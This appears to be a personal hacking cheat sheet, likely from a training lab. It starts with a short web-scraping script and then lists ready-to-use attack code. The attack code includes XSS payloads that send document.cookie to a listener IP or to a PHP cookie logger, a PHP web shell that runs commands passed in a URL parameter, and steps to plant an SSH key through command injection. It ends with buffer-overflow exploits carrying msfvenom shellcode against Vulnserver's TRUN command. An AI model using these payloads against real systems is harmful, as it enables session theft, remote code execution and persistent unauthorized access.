Scraping Data, html
  #!/usr/bin/python
  ### Imports ###
  import lxml.html
  import requests
   
  ### Grabs the webpage ###
  page = requests.get('http://quotes.toscrape.com')
  tree = lxml.html.fromstring(page.content)
   
  ### Outlines the tag you want to grab ###
  # Change //small[...[ to whatever tag. Leave /text() as is
  results = tree.xpath('//small[@class="author"]/text()')
  
  ### Prints it out ###
  print ('Results: ',results)
  

COOKIE STEALING!
 run on opstation: 
  python3 -m http.server using   <script>document.location="http://10.50.38.82:8000/"+document.cookie;</script>

-----OR-----
<?php
$cookie = $_GET["username"]
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>
(Cookie_Stealer.php)

using      <script>document.location="http://serveripport/uploads/cookie_stealer.php?username="+document.cookie;</script>






WEB SHELL:
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>




SSH KEYGEN:
ssh-keygen -t rsa -b 4096 ( on lin-ops) in .ssh

##NEED COMMAND INJECTION OR WEBSHELL##
### verify locations and folders/files before ^^!!!!
 ls -la /users/home/directory      #check if .ssh exists
 mkdir /users/home/directory/.ssh  (/var/www/.ssh)
 
copy to user(whoami) home page /../.ssh
echo "key" >> /../.ssh/authorized_keys  (/var/www/.ssh)
cat to verify

ssh -i .ssh/id_rsa www-data@10.50.37.95








#! /usr/bin/python3

offset = "A" * 71
eip = "B" * 4

#eip = "\x0f\x46\xf6\xf7"   #reverse endian
#nop = "\x90" * 10

print(offset + eip )   #IN THIS ORDER






#! /usr/bin/python3

offset = "A" * 76
#eip = "B" * 4



eip = "\x97\x54\xf6\xf7"   #reverse endian
nop = "\x90" * 10


buf =  b""
buf += b"\xbe\xa0\xd6\x97\xc3\xda\xc2\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x0b\x31\x73\x14\x03\x73\x14\x83\xc3\x04\x42"
buf += b"\x23\xfd\xc8\xda\x55\x50\xa9\xb2\x48\x36\xbc\xa5\xfb"
buf += b"\x97\xcd\x41\xfc\x8f\x1e\xf3\x95\x21\xe8\x10\x37\x56"
buf += b"\xed\xd6\xb8\xa6\x85\xbe\xd7\xc7\x04\x57\x28\x5f\x84"
buf += b"\x2e\xc9\x92\xaa"

print(offset + eip + nop + buf  )   #IN THIS ORDER






#!/usr/bin/python

import socket
import os
import sys

host = "192.168.150.245"
port = 9999
   #windows/meterprety/reverse_tcp lhost=XXXX lport=XXXX
#msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
#payload size : 355 bytes
shellcode = ("\xbd\x48\xb8\xaa\xe8\xd9\xce\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x53\x83\xee\xfc\x31\x6e\x0e\x03\x26\xb6\x48\x1d\x4a\x2e\x0e"
"\xde\xb2\xaf\x6f\x56\x57\x9e\xaf\x0c\x1c\xb1\x1f\x46\x70\x3e"
"\xeb\x0a\x60\xb5\x99\x82\x87\x7e\x17\xf5\xa6\x7f\x04\xc5\xa9"
"\x03\x57\x1a\x09\x3d\x98\x6f\x48\x7a\xc5\x82\x18\xd3\x81\x31"
"\x8c\x50\xdf\x89\x27\x2a\xf1\x89\xd4\xfb\xf0\xb8\x4b\x77\xab"
"\x1a\x6a\x54\xc7\x12\x74\xb9\xe2\xed\x0f\x09\x98\xef\xd9\x43"
"\x61\x43\x24\x6c\x90\x9d\x61\x4b\x4b\xe8\x9b\xaf\xf6\xeb\x58"
"\xcd\x2c\x79\x7a\x75\xa6\xd9\xa6\x87\x6b\xbf\x2d\x8b\xc0\xcb"
"\x69\x88\xd7\x18\x02\xb4\x5c\x9f\xc4\x3c\x26\x84\xc0\x65\xfc"
"\xa5\x51\xc0\x53\xd9\x81\xab\x0c\x7f\xca\x46\x58\xf2\x91\x0e"
"\xad\x3f\x29\xcf\xb9\x48\x5a\xfd\x66\xe3\xf4\x4d\xee\x2d\x03"
"\xb1\xc5\x8a\x9b\x4c\xe6\xea\xb2\x8a\xb2\xba\xac\x3b\xbb\x50"
"\x2c\xc3\x6e\xcc\x24\x62\xc1\xf3\xc9\xd4\xb1\xb3\x61\xbd\xdb"
"\x3b\x5e\xdd\xe3\x91\xf7\x76\x1e\x1a\xe6\xda\x97\xfc\x62\xf3"
"\xf1\x57\x1a\x31\x26\x60\xbd\x4a\x0c\xd8\x29\x02\x46\xdf\x56"
"\x93\x4c\x77\xc0\x18\x83\x43\xf1\x1e\x8e\xe3\x66\x88\x44\x62"
"\xc5\x28\x58\xaf\xbd\xc9\xcb\x34\x3d\x87\xf7\xe2\x6a\xc0\xc6"
"\xfa\xfe\xfc\x71\x55\x1c\xfd\xe4\x9e\xa4\xda\xd4\x21\x25\xae"
"\x61\x06\x35\x76\x69\x02\x61\x26\x3c\xdc\xdf\x80\x96\xae\x89"
"\x5a\x44\x79\x5d\x1a\xa6\xba\x1b\x23\xe3\x4c\xc3\x92\x5a\x09"
"\xfc\x1b\x0b\x9d\x85\x41\xab\x62\x5c\xc2\xcb\x80\x74\x3f\x64"
"\x1d\x1d\x82\xe9\x9e\xc8\xc1\x17\x1d\xf8\xb9\xe3\x3d\x89\xbc"
"\xa8\xf9\x62\xcd\xa1\x6f\x84\x62\xc1\xa5")

buffer = "A"*2003
buffer += "\xad\x12\x50\x62"            ### x625012ad from essfunc.ddl
buffer += "\x90"*16
buffer += shellcode
buffer += "C"*(5000-len(buffer))

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) #create the socket
s.connect((host,port)) #connect to target
print s.recv(1024) #print response
print "[+] Sending exploit..."
s.send("TRUN /.:/" + buffer) #send the stage
print s.recv(1024)
s.close()



